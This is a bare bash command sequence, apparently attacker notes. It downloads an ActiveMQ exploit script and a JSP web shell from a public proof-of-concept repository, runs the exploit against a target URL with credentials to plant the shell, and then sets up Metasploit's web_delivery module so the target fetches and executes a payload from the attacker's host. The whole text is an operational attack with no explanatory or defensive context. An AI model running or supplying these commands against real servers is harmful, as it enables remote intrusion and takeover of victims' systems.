```bash
wget https://raw.githubusercontent.com/coffeehb/Some-PoC-oR-ExP/master/ActiveMQExP/ActiveMQExPV1.0.py
wget https://raw.githubusercontent.com/coffeehb/Some-PoC-oR-ExP/master/ActiveMQExP/cmd.jsp

python ActiveMQExPV1.0.py -h
python ActiveMQExPV1.0.py -url [URL to Target] -user [Username] -pass [Password] -shell cmd.jsp

msfconsole
search delivery
use exploit/multi/script/web_delivery
set lhost [Interface]
set uripath [URL]
run
```